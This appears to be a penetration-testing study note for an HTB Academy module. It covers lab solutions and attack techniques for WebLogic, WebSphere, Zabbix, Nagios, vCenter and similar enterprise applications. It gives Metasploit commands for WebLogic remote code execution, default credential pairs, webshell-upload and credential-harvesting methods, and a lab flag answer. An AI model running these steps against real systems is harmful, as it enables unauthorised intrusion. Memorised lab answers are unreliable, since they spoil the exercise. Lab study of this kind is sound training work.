```markdown
# 📝 Other Notable Applications - Quick Reference

> [!ABSTRACT] Objective: 
> This is a reference guide for additional applications commonly encountered during penetration tests, covering common vulnerabilities, default credentials, and attack techniques.

---

## Overview

Beyond the main applications covered in this module, penetration testers encounter many other applications in enterprise environments. This reference covers **common vulnerabilities**, **default credentials**, and **attack techniques** for frequently seen applications.

---

## HTB Academy Lab Solutions

### 🎯 Lab 1: Application Identification
> [!QUESTION]
> Enumerate the target host and identify the running application. What application is running?

```bash
# Standard enumeration
nmap -sV -sC target
```

**Expected Output:** WebLogic server identification.

---

### 🦾 Lab 2: WebLogic RCE Exploitation
**Question:** "Enumerate the application for vulnerabilities. Gain remote code execution and submit the contents of the flag.txt file on the administrator desktop."

#### Method: Metasploit WebLogic RCE

```bash
# Launch Metasploit
msfconsole -q

# Use WebLogic RCE module
use multi/http/weblogic_admin_handle_rce

# Set target options
set RHOSTS STMIP
set SRVHOST PWNIP  
set LHOST PWNIP

# Execute exploit
exploit

# In Meterpreter session:
cat C:/Users/Administrator/Desktop/flag.txt
```

**Answer:** `w3b_l0gic_RCE!`

---

## Notable Applications

### 🔧 Application Servers

#### **Axis2**
> [!INFO]
> - Description: Web services framework (often on Tomcat)
> - Attack Vectors: Default admin credentials, AAR file upload
> - Default Creds: Check vendor documentation
> - Exploitation: Upload webshell via AAR service files
> - Tools: Metasploit modules available

#### **WebSphere**
> [!INFO]
> - Description: IBM Java EE application server
> - Attack Vectors: Default credentials, WAR file deployment
> - Default Creds: `system:manager`
> - Exploitation: Deploy WAR files for RCE
> - CVEs: Many deserialization vulnerabilities

#### **WebLogic**
> [!INFO]
> - Description: Oracle Java EE application server
> - Attack Vectors: Deserialization RCE, default credentials
> - CVEs: 190+ reported vulnerabilities
> - Exploitation: Unauthenticated RCE (2007-2021)
> - Common Ports: 7001, 7002

---

### 📊 Monitoring Systems

#### **Zabbix**
> [!INFO]
> - Description: Open-source network monitoring
> - Attack Vectors: SQL injection, auth bypass, RCE via API
> - Vulnerabilities: XSS, LDAP disclosure, command injection
> - API Abuse: Remote command execution capabilities
> - HTB Reference: Zipper box

#### **Nagios**
> [!INFO]
> - Description: System/network monitoring solution
> - Attack Vectors: Multiple RCE, privilege escalation
> - Default Creds: `nagiosadmin:PASSW0RD`
> - Vulnerabilities: SQL injection, code injection, XSS
> - CVEs: Wide variety over the years

---

### 🔍 Data & Search

#### **Elasticsearch**
> [!INFO]
> - Description: Search and analytics engine
> - Attack Vectors: Various CVEs, misconfigurations
> - Common Issues: Open instances, data exposure
> - HTB Reference: Haystack box
> - Ports: 9200, 9300

---

### 🏢 Enterprise Applications

#### **vCenter**
> [!INFO]
> - Description: VMware management platform
> - Attack Vectors: Weak credentials, CVE exploits
> - Notable CVEs:
>   - Apache Struts 2 RCE
>   - CVE-2021-22005 (OVA upload)
> - Impact: Often runs as SYSTEM/domain admin
> - Platforms: Windows and Linux appliances

#### **SharePoint/Wikis**
> [!INFO]
> - Description: Collaboration platforms, internal wikis
> - Attack Vectors: Known CVEs, search functionality abuse
> - Data Sources: Document repositories, credential discovery
> - Common Finds: Valid credentials in documents

#### **DotNetNuke (DNN)**
> [!INFO]
> - Description: Open-source C# CMS
> - Attack Vectors: Auth bypass, directory traversal
> - Vulnerabilities: File upload bypass, arbitrary download
> - Framework: .NET-based

---

## Quick Attack Methodology

### 1. **Fingerprinting**

```bash
# Identify application and version
nmap -sV -sC target
nikto -h http://target
whatweb target
```

### 2. **Default Credentials**
> [!EXAMPLE]
>
> ```bash
> # Common default combinations
> admin:admin
> admin:password
> system:manager
> nagiosadmin:PASSW0RD
> ```

### 3. **Version-Specific Exploits**

```bash
# Search for known exploits
searchsploit application_name version
nmap --script vuln target
```

### 4. **Built-in Functionality Abuse**
- File upload capabilities
- Command execution features
- API endpoints for automation
- Administrative functions

---

## Assessment Strategy

### Discovery Phase
> [!CHECK]
>- 🔍 Port scanning - Identify all running services
>- 📊 Service enumeration - Version and configuration detection
>- 🎯 Application mapping - Create comprehensive inventory

### Exploitation Phase
> [!CHECK]
>- 🔑 Default credentials testing
>- 🐛 Known vulnerability exploitation  
>- ⚙️ Built-in functionality abuse
>- 📁 File upload and deployment attacks

### Intelligence Gathering
> [!CHECK]
>- 📄 Document repositories searching
>- 🔐 Credential harvesting from files
>- 🏗️ Infrastructure mapping via configs
>- 🔗 Lateral movement opportunities

---

## Key Takeaways

**Common Attack Patterns:**
- 🔓 Default credentials remain unchanged
- 📦 File upload functionality for shells
- 🔧 Built-in features for command execution
- 📊 API abuse for automation and RCE

**High-Impact Targets:**
- Monitoring systems (network visibility)
- Virtualization platforms (infrastructure control)
- Application servers (web application hosting)
- Document repositories (credential discovery)

**Assessment Tips:**
- 📋 Always check for default credentials first
- 🔍 Look for file upload functionality
- 📚 Search documentation for API endpoints
- 🎯 Focus on administrative interfaces

**💡 Pro Tip:** Many enterprises run hundreds of different applications - develop a systematic approach to quickly identify, fingerprint, and test each one. Often the most critical vulnerabilities are in lesser-known monitoring or management applications running with high privileges.
```